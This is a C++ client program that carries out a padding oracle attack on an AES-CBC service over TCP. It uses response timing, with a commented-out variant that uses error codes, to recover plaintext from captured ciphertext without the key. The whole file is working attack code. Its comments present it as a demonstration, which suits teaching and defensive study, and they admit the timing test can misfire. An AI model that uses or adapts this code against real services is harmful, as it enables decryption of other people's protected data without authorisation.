
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <iostream>
#include <chrono>
using namespace std;

#include <openssl/err.h>

#include <openssl/bio.h>
#include <openssl/bioerr.h>

#include <openssl/evp.h>
#include <openssl/evperr.h>

#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#define PORT 8080

enum enumErrors { FAILUER, SUCCESS, DECRYPTIONERROR, AUTHERROR };

int main(int argc, char const* argv[])
{
	int sock = 0, valread, client_fd;
	struct sockaddr_in serv_addr;
	cout << "socket" << endl;
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		printf("\n Socket creation error \n");
		return -1;
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(PORT);

	// Convert IPv4 and IPv6 addresses from text to binary
	// form
	//if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0)
	cout << "inet_pton" << endl;
	if (inet_pton(AF_INET, argv[1], &serv_addr.sin_addr) <= 0)
	{
		printf("\nInvalid address/ Address not supported \n");
		return -1;
	}

	cout << "connect" << endl;
	if ((client_fd = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0)
	{
		printf("\nConnection Failed \n");
		return -1;
	}
	//send(sock, hello, strlen(hello), 0);
	//printf("Hello message sent\n");
	//valread = read(sock, buffer, 1024);
	//printf("%s\n", buffer);
	//while(1)
	//{
	//    cout << "getline" << endl;
	//   size_t size = 1024;
	//   //getline((char**)&buffer, &size, stdin);
	//  gets(buffer);
	//   cout << buffer << endl;
	//   if (strcmp(buffer, "q") == 0) break;
	//  cout << "send" << endl;
	//    send(sock, buffer, strlen(buffer) + 1, 0);
	//    printf("message sent\n");
	//    cout << "read" << endl;
	//    valread = read(sock, buffer, 1024);
	//    printf("%s\n", buffer);
	//}

	// We have just the cipher text and we need to decrypt and we don't have the key,
	// using Padding Oracle Attack, and one of the Side Channel Attack namely Timing
	// Attack. I have also commented the code that can also be demonstrated using Error
	// Handling Attack.
	unsigned char szCapturedCipherText[] = {
			0xF0, 0xCE, 0xF9, 0x39, 0x2F, 0x94, 0xD1, 0xB8, 0x61, 0x12, 0x3B, 0xFE, 0x96, 0x87, 0x88, 0xE7, // IV
			0xa1, 0xd2, 0xed, 0x52, 0x90, 0xad, 0x50, 0x83, 0xf4, 0xf0, 0xb7, 0x52, 0x6a, 0x9b, 0x73, 0xb0, // Encrypted message
			0x45, 0xdd, 0xf0, 0xd5, 0x0e, 0x1b, 0x4b, 0xfa, 0xf7, 0xcb, 0x74, 0x2e, 0xc9, 0x8f, 0x6b, 0x52, // Encrypted message
			0xc6, 0x01, 0x6a, 0x89, 0x1f, 0x0f, 0xc0, 0x72, 0xdd, 0x7b, 0xf0, 0x2a, 0xaa, 0x82, 0xbd, 0x91 // encrypted Pad
	};
	int nCapturedCipherLen = 64;
	unsigned char szModifiedCipherText[64];
	int nModifiedCipherLen = 64;
	unsigned char szMessageCracked[32]; // Contains decrypted message
	int nMessageCrackedLen = 0;

	while(1)
	{
		cout << "Captured ciper text ebcrypted using AES-CBC mode:" << endl;
		BIO_dump_fp(stdout, (const char*)szCapturedCipherText, nCapturedCipherLen);
		cout << "send the valid cipher text and find the time" << endl;
		std::chrono::system_clock::time_point start_time = std::chrono::system_clock::now();
		send(sock, szCapturedCipherText, nCapturedCipherLen, 0);
		int nStatus = 0;
		valread = read(sock, (void*)&nStatus, sizeof(int));
		std::chrono::system_clock::time_point end_time = std::chrono::system_clock::now();
		std::chrono::duration time3 = std::chrono::duration_cast<chrono::nanoseconds>(end_time - start_time);
        std::cout << "Elapsed time: " << time3.count() << "ns" << endl;
		cout << nStatus << endl;


		std::chrono::duration time2 = std::chrono::duration_cast<chrono::nanoseconds>(std::chrono::nanoseconds(0));
		std::chrono::duration time1 = std::chrono::duration_cast<chrono::nanoseconds>(std::chrono::nanoseconds(0));
		memset(szMessageCracked, 0, 32);
		// Trying every byte of cipher and crack the message without the key
		// Drop the last padding block and start from pervious block
		for (int i = nCapturedCipherLen - 0x20 - 1; i >= 0; i--)
		{
			for(unsigned char szVal = 0; szVal < 255; szVal++)
			{
				int nNumOfBlocks = (i / 0x10) + 2;
				int nNumOdBytes = nNumOfBlocks * 0x10;
				// Copy the original cipher text by droping the last block
				nModifiedCipherLen = nNumOdBytes; /*IV + 2 blocks of encrypted message*/
				memcpy(szModifiedCipherText, szCapturedCipherText, nModifiedCipherLen /*Drop the last padded block*/);
				//getchar();

				// Try for every modified cipher by forming a valid pad
				// To create the valid block modify the previous block.
				//szModifiedCipherText[31] ^= szVal ^ (0x01);
				// or
				//szModifiedCipherText[31] ^= szMessageCracked[15] ^ (0x02);
				//cout << nMessageCrackedLen << endl;
				//cout << (nMessageCrackedLen % 0x10) << endl;
				//if (nMessageCrackedLen > 15)
				//	getchar();
				for(int j = 0; j < (nMessageCrackedLen % 0x10); j++)
				{
					//cout << i << endl << j << endl;
					szModifiedCipherText[i + j + 1] ^= szMessageCracked[i + j + 1] ^ (0x10 - (i % 0x10));
				}
				//szModifiedCipherText[30] ^= szVal ^ (0x02);
				szModifiedCipherText[i] ^= szVal ^ (0x10 - (i % 0x10));

				start_time = std::chrono::system_clock::now();
				send(sock, szModifiedCipherText, nModifiedCipherLen, 0);
				int nStatus1 = 0;
				valread = read(sock, (void*)&nStatus1, sizeof(int));
				end_time = std::chrono::system_clock::now();
				//cout << nStatus1 << endl;

				// By assuming that 0 value where decryption fails but in reality 0 might be include
				// for example if the file is an encrypted binary file. A better way of calculating mey
				// be implemented. But for the sake of demonstration I am using 0 value as failuer case.
				// time1 < tim2r < time3.
				// If time2 lies near to the middle of time1 and time3 Then
				// Decryption was successful but validation failed.
				if (1 == szVal)
					time1 = std::chrono::duration_cast<chrono::nanoseconds>(end_time - start_time);
				else
					time2 = std::chrono::duration_cast<chrono::nanoseconds>(end_time - start_time);
				cout << "time1: " << time1.count() <<  endl;
				cout << "time2: " << time2.count() <<  endl;
				cout << "time3: " << time3.count() <<  endl << endl;
				//getchar();

				// Decryption is successful but authentication failed means
				// The cipher block is the valid block and reveling the
				// decrypted message
				//if (enumErrors::AUTHERROR == nStatus1)
				if (time2 < time3 && time2 > time1) // This may not always show the same Behavior and may prone to errors
				{
					// The message is only 16 byte exclusig the IV and the padding
					szMessageCracked[i] = szVal;
					nMessageCrackedLen++;
					//cout << "Message" << endl;
					//BIO_dump_fp(stdout, (const char*)szMessageCracked, 32);
					cout << "time1: " << time1.count() <<  endl;
					cout << "time2: " << time2.count() <<  endl;
					cout << "time3: " << time3.count() <<  endl;
					getchar();
					break;
				}
			}
		}

		cout << "Complete Decrypted message" << endl;
		BIO_dump_fp(stdout, (const char*)szMessageCracked, nMessageCrackedLen);

		if (1 == nStatus)
			break;
	}

	// closing the connected socket
	close(client_fd);
	return 0;
}
